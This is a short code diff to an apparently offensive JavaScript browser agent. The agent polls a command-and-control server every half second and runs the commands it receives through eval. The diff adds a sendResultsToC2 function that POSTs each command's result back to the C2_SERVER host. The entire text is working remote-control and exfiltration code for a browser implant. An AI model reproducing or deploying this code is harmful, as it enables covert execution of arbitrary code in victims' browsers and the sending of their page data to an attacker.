@@ -21,7 +21,8 @@ function pull(){
     if(Object.keys(json).length == 0)
       return;
     if('command' in json){ // dom command
-      eval(json.command);
+      results=eval(json.command);
+      sendResultsToC2(json.id, JSON.stringify({'result':results}))
     }
   });
 }
@@ -32,3 +33,13 @@ setInterval(function(){
     return;
   pull();
 }, 500);
+
+
+
+function sendResultsToC2(cmdID, data){
+  fetch(C2_SERVER + '/dom/' + agentID + '/' + cmdID, {
+    body: data,
+    method: 'POST',
+    headers: new Headers({'content-type': 'application/json'})
+  });
+}
